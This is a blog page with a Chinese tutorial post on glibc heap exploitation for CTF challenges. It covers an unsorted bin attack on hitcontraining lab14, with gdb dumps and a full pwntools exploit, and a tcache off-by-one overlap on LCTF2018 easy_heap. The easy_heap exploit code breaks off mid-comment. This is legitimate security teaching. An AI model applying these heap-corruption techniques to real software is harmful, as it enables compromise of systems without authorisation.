<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="English">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="One people that no one know">
<meta property="og:type" content="website">
<meta property="og:title" content="NoOne-hub">
<meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;page&#x2F;4&#x2F;index.html">
<meta property="og:site_name" content="NoOne-hub">
<meta property="og:description" content="One people that no one know">
<meta property="og:locale" content="English">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://noone-hub.github.io/page/4/"/>





  <title>NoOne-hub</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="English">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">NoOne-hub</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">A place that No One knw</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-heap-learn-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn-heap-learn-7/" itemprop="url">pwn/pwn-heap-learn-7</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="pwn堆入门系列教程7"><a href="#pwn堆入门系列教程7" class="headerlink" title="pwn堆入门系列教程7"></a>pwn堆入门系列教程7</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a><br><a href="https://xz.aliyun.com/t/6322" target="_blank" rel="noopener">pwn堆入门系列教程4</a><br><a href="https://xz.aliyun.com/t/6377" target="_blank" rel="noopener">pwn堆入门系列教程5</a><br><a href="https://xz.aliyun.com/t/6406" target="_blank" rel="noopener">pwn堆入门系列教程6</a></p>
<p>先学习 Unsorted Bin Attack，这部分由于ctf-wiki题目较少，所以只练习了一道题<br>Large bin也没有题目，到时候遇到在进行学习</p>
<h2 id="hitcontraining-lab14"><a href="#hitcontraining-lab14" class="headerlink" title="hitcontraining_lab14"></a>hitcontraining_lab14</h2><p>这个题过程也比较简单，自己复现下就好</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>因为现在都是tcache了，所以复现起来还是得拿老版本libc测试</p>
<p>这里可以看出bk已经被修改</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x9ce0d0-0xd0</span><br><span class="line">0x9ce000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x9ce010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x9ce020:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x9ce030:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x9ce040:	0x0000000a61646164	0x00000000006020b0</span><br><span class="line">0x9ce050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0c0:	0x0000000000000090	0x0000000000000031</span><br><span class="line">0x9ce0d0:	0x0000000a33333333	0x0000000000000000</span><br><span class="line">0x9ce0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0f0:	0x0000000000000000	0x0000000000020f11</span><br><span class="line">0x9ce100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>


<p>这里可以看到magic被修改了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x00000000006020b0+0x10</span><br><span class="line">0x6020c0 &lt;magic&gt;:	0x00007ff41afe4b78	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;heaparray&gt;:	0x00000000009ce010	0x00000000009ce040</span><br><span class="line">0x6020f0 &lt;heaparray+16&gt;:	0x00000000009ce0d0	0x0000000000000000</span><br><span class="line">0x602100 &lt;heaparray+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602110 &lt;heaparray+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602120 &lt;heaparray+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602150:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>拿到flag了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x1a bytes:</span><br><span class="line">    <span class="string">'flag&#123;unsorted_bin_attack&#125;\n'</span></span><br><span class="line">flag&#123;unsorted_bin_attack&#125;</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'magicheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'magicheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_heap</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_heap</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_heap</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    create_heap(<span class="number">0x20</span>, <span class="string">"1111"</span>)  <span class="comment"># 0</span></span><br><span class="line">    create_heap(<span class="number">0x80</span>, <span class="string">"2222"</span>)  <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># in order not to merge into top chunk</span></span><br><span class="line">    create_heap(<span class="number">0x20</span>, <span class="string">"3333"</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">    del_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    magic = <span class="number">0x00000000006020C0</span></span><br><span class="line">    fd = <span class="number">0</span></span><br><span class="line">    bk = magic - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    edit_heap(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">    create_heap(<span class="number">0x80</span>, <span class="string">"dada"</span>)  <span class="comment">#trigger unsorted bin attack</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"4869"</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<p>unsortbin attack通常用于修改循环次数以及global_max_fast从而任意大小chunk可以fastbin attack</p>
<p>然后开始学习tcache</p>
<h2 id="LCTF2018-PWN-easy-heap"><a href="#LCTF2018-PWN-easy-heap" class="headerlink" title="LCTF2018 PWN easy_heap"></a>LCTF2018 PWN easy_heap</h2><p>我感觉这道题质量挺高的，对于我这个新手来说，他用了挺多内存分配的知识，让我好好补了一波，这道题功能分析以及漏洞点分析请看ctf-wiki tcache篇</p>
<p>我直接讲解漏洞利用过程</p>
<h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>这道题麻烦就麻烦在没法直接溢出覆盖pre_size，所以要巧妙的构造pre_size，最终在overlap，后面的就是常规操作了</p>
<p>具体过程是跟ctf-wiki一样<br>具体过程：</p>
<ol>
<li>将 A -&gt; B -&gt; C 三块 unsorted bin chunk 依次进行释放</li>
<li>A 和 B 合并，此时 C 前的 prev_size 写入为 0x200</li>
<li>A 、 B 、 C 合并，步骤 2 中写入的 0x200 依然保持</li>
<li>利用 unsorted bin 切分，分配出 A</li>
<li>利用 unsorted bin 切分，分配出 B，注意此时不要覆盖到之前的 0x200</li>
<li>将 A 再次释放为 unsorted bin 的堆块，使得 fd 和 bk 为有效链表指针</li>
<li>此时 C 前的 prev_size 依然为 0x200（未使用到的值），A B C 的情况： A (free) -&gt; B (allocated) -&gt; C (free)，如果使得 B 进行溢出，则可以将已分配的 B 块包含在合并后的释放状态 unsorted bin 块中。</li>
<li>tips: 但是在这个过程中需要注意 tcache 的影响。</li>
</ol>
<h4 id="堆初始化操作部分"><a href="#堆初始化操作部分" class="headerlink" title="堆初始化操作部分"></a>堆初始化操作部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/home/NoOne/Documents/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<h4 id="堆块重新排列"><a href="#堆块重新排列" class="headerlink" title="堆块重新排列"></a>堆块重新排列</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">9</span>) <span class="comment">#tcache for avoid top chunk consolidate</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># tcache-0</span></span><br><span class="line"><span class="comment"># tcache-1</span></span><br><span class="line"><span class="comment"># tcache-2</span></span><br><span class="line"><span class="comment"># tcache-3</span></span><br><span class="line"><span class="comment"># tcache-4</span></span><br><span class="line"><span class="comment"># tcache-5</span></span><br><span class="line"><span class="comment"># unsorted - 6</span></span><br><span class="line"><span class="comment"># unsorted - 7</span></span><br><span class="line"><span class="comment"># unsorted - 8</span></span><br><span class="line"><span class="comment"># tcache-9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-1</span></span><br><span class="line"><span class="comment"># chunk - 7</span></span><br><span class="line"><span class="comment"># chunk - 8</span></span><br><span class="line"><span class="comment"># chunk - 9</span></span><br><span class="line"><span class="comment"># chunk-0</span></span><br></pre></td></tr></table></figure>

<h4 id="off-by-one覆盖造成overlap"><a href="#off-by-one覆盖造成overlap" class="headerlink" title="off-by-one覆盖造成overlap"></a>off-by-one覆盖造成overlap</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># now chunk -9's pre_size is 0x200</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, str(<span class="number">8</span>)*<span class="number">0x7</span>) <span class="comment">#off-by-one change chunk9's insue</span></span><br><span class="line">free(<span class="number">6</span>) <span class="comment"># free into tcache, so we can use unsortbin consolidate</span></span><br><span class="line">free(<span class="number">9</span>) <span class="comment"># unsortbin consolidate</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6   tcache</span></span><br><span class="line"><span class="comment"># chunk-5   tcache</span></span><br><span class="line"><span class="comment"># chunk-4   tcache</span></span><br><span class="line"><span class="comment"># chunk-3   tcache</span></span><br><span class="line"><span class="comment"># chunk-2   tcache</span></span><br><span class="line"><span class="comment"># chunk-1   tcache</span></span><br><span class="line"><span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line"><span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line"><span class="comment"># chunk - 9 unsorted</span></span><br><span class="line"><span class="comment"># chunk-0   tcache</span></span><br></pre></td></tr></table></figure>
<p>这里需要注意的是，off-by-one这里要覆盖到inuse的话，是得申请0xf8大小，malloc(0xf8)后，</p>
<ol>
<li>它会重用下个堆快的pre_size作为数据块</li>
<li>所以我们off-by-one才能覆盖到insue位<br>他会在ptr[0xf8]=0;这里就将size处的insue变成0<br>然后此时tcache还没满，所以free(6)让tcache填满后，才能用触发unsortbin合并</li>
</ol>
<h4 id="申请0xf8-让剩余的unsortbin对齐到第0块chunk"><a href="#申请0xf8-让剩余的unsortbin对齐到第0块chunk" class="headerlink" title="申请0xf8,让剩余的unsortbin对齐到第0块chunk"></a>申请0xf8,让剩余的unsortbin对齐到第0块chunk</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6   tcache</span></span><br><span class="line"><span class="comment"># chunk-5   tcache</span></span><br><span class="line"><span class="comment"># chunk-4   tcache</span></span><br><span class="line"><span class="comment"># chunk-3   tcache</span></span><br><span class="line"><span class="comment"># chunk-2   tcache</span></span><br><span class="line"><span class="comment"># chunk-1   tcache</span></span><br><span class="line"><span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line"><span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line"><span class="comment"># chunk - 9 unsorted</span></span><br><span class="line"><span class="comment"># chunk-0   tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">1</span>)*<span class="number">0x7</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>, str(<span class="number">0x8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap</span></span><br><span class="line"><span class="comment"># chunk-1 </span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-8 </span></span><br><span class="line"><span class="comment"># chunk-0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 